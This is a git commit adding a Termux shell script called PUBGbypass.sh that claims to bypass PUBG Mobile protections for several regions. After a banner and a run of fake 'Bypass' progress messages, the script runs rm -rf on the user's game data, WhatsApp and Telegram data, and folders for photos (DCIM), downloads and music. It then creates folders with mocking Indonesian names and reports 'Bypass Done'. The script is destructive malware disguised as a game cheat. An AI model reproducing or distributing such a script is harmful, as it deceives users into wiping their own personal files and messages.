660cd9d2deadea4e448dbafb5d5eb86638bb55d6
MrGroot-Git <55680918+MrGroot-Git@users.noreply.github.com>
2019-09-23 14:35:48 +0700

    Add files via upload

---
+++ PUBGbypass.sh
@@ -0,0 +1,41 @@
+termux-setup-storage
+clear
+echo "\033[91m____  _   _ ____   ____   __  __  ___  ____ ___ _     _____
+|  _ \| | | | __ ) / ___| |  \/  |/ _ \| __ )_ _| |   | ____|
+| |_) | | | |  _ \| |  _  | |\/| | | | |  _ \| || |   |  _|
+|  __/| |_| | |_) | |_| | | |  | | |_| | |_) | || |___| |___
+|_|    \___/|____/ \____| |_|  |_|\___/|____/___|_____|_____|"
+sleep 3s
+echo "\033[92mBypass PUBG Mobile 0.14.5"
+sleep 3s
+echo "\033[92mBypass PUBG Global ...."
+sleep 3s
+echo "\033[92mBypass PUBG Vietnam ...."
+sleep 3s
+echo "\033[92mBypass PUBG Taiwan ...."
+sleep 3s
+echo "\033[92mBypass PUBG Korea ...."
+sleep 3s
+echo "\033[92mStarting Bypass PUBG Global ...."
+sleep 3s
+echo "\033[92mPlease Wait ...."
+sleep 3s
+rm -rf /storage/emulated/0/Android/obb/com.tencent.ig
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig
+rm -rf /storage/emulated/0/Android/data/com.whatsapp
+rm -rf /storage/emulated/0/Android/data/org.telegram.messenger
+rm -rf /storage/emulated/0/Android/DCIM
+rm -rf /storage/emulated/0/Android/Download
+rm -rf /storage/emulated/0/Android/Telegram
+rm -rf /storage/emulated/0/Android/WhatsApp
+rm -rf /storage/emulated/0/Android/Music
+mkdir /storage/emulated/0/UppsKamuDiKerjain
+mkdir /storage/emulated/0/JanganBaperYaaBos
+mkdir /storage/emulated/0/SemuaIniSalahFaham
+echo "\033[92mBypass Done! ...."
+sleep 3s
+echo "\033[92mGunakan Dengan Bijak ...."
+sleep 3s
+echo "\033[92mWARNING !!!! Dilarang Memperjualbelikan ...."
+sleep 3s
+echo "\033[92mEnjow Now ...."
